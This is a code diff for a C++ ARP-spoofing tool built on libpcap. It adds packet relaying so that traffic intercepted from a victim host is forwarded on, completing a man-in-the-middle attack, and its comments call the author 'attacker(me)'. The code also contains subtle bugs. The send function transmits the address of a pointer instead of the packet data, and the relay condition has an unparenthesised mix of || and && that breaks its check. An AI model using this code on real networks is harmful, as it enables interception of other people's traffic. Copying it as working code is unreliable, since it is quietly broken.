@@ -40,6 +40,20 @@ void sendArp(pcap_t *handle, EthArpPacket pkt)
 	}
 }
 
+void sendIp(pcap_t *handle, const u_char *pkt)
+{
+	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pkt), sizeof(EthIpPacket));
+	if (res != 0) {
+		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+	}
+	else
+	{
+		printf("\n----------------------------------------\n");
+		printf("[*] Ip packet relaying succeeded!");
+		printf("\n----------------------------------------\n");
+	}
+}
+
 void continueSendArp(pcap_t *handle, EthArpPacket pkt, int repeat)
 {
 	while(true)
@@ -52,8 +66,8 @@ void continueSendArp(pcap_t *handle, EthArpPacket pkt, int repeat)
 bool isRefreshed(pcap_t* handle, const u_char *receivedPkt, FlowInfo flow)
 {
 	EthArpPacket *pkt = (EthArpPacket *)receivedPkt;
-	// case : broadcast
-	if(pkt->eth_.dmac_ == Mac::broadcastMac())
+	// case : broadcast (ARP)
+	if(pkt->eth_.type_ == EthHdr::Arp && pkt->eth_.dmac_ == Mac::broadcastMac())
 	{
 		// sender broadcast
 		if(pkt->arp_.sip_ == flow.senderIp && pkt->eth_.smac_ == flow.senderMac)
@@ -80,9 +94,21 @@ bool isRefreshed(pcap_t* handle, const u_char *receivedPkt, FlowInfo flow)
 	return false;
 }
 
-void relayPacket()
+void relayPacket(pcap_t *handle, const u_char *receivedPkt, FlowInfo flow)
 {
-	
+	// Check that receivedPkt is from sender, and destination mac is attacker(me)
+	if(((EthIpPacket *)receivedPkt)->eth_.type_ == EthHdr::Ip4 || ((EthIpPacket *)receivedPkt)->eth_.type_ == EthHdr::Ip6 &&
+	((EthIpPacket *)receivedPkt)->eth_.dmac_ == flow.attackerMac)
+	{
+		// Check if it's the receivedPkt for attacker(me)
+		if(((EthIpPacket *)receivedPkt)->ip_.dip_ != flow.attackerIp)
+		{ // if it is not the packet for me, modify and relay the packet
+			((EthIpPacket *)receivedPkt)->eth_.smac_ = flow.attackerMac;
+			((EthIpPacket *)receivedPkt)->eth_.dmac_ = flow.targetMac;
+			sendIp(handle, receivedPkt);
+		}
+		
+	}
 }
 
 void spoofProcess(int mode, pcap_t *handle, EthArpPacket pkt, FlowInfo flow)
@@ -104,7 +130,7 @@ void spoofProcess(int mode, pcap_t *handle, EthArpPacket pkt, FlowInfo flow)
 		if (isRefreshed(handle, receivedPkt, flow))
 			sendArp(handle, pkt);
 		else
-			relayPacket();
+			relayPacket(handle, receivedPkt, flow);
 	}
 
 	sendArpThread.detach();
